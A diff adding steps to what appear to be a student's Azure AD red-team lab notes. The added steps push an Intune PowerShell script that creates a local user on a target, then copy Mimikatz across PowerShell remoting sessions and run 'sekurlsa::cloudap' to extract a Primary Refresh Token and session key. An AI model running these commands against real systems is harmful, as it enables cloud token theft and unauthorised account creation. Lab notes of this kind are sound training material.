@@ -1319,3 +1319,26 @@ Invoke-Command -Session $infradminsrv -ScriptBlock{cat C:\Users\Public\student21
 	- Mark HTTPOnly and Secure for the cookie
  - Visit ```https://login.microsoftonline.com/login.srf``` again (hit F5?)
  - 
+#### Once logged on
+- Go to Devices -> All Devices to check devices enrolled to Intune:
+- Go to Scripts and Click on Add for Windows 10.
+- In the Add PowerShell script, add a new script and name it student213
+- On the script settings page, use ```adduser.ps1``` from the C:\AzAD\Tools directory.
+  - Make sure to modify the adduser.ps1 script so that it adds a studentx on the target machine.
+ 
+## Alternative: Extract PRT using Mimikatz and use with roadtx
+
+Copy Mimikatz on jumpvm using the below command: 
+```
+Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\mimikatz.exe -Destination C:\Users\student1\Documents -Verbose
+```
+
+Copy Mimikatz from jumpvm to infradminsrv: 
+```
+Copy-Item -ToSession $infradminsrv -Path C:\Users\student1\Documents\mimikatz.exe -Destination C:\Users\Public\student1 -Verbose
+```
+
+Extract PRT and encrypted Session key from the target VM:
+```
+Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student1\mimikatz.exe sekurlsa::cloudap exit}
+```
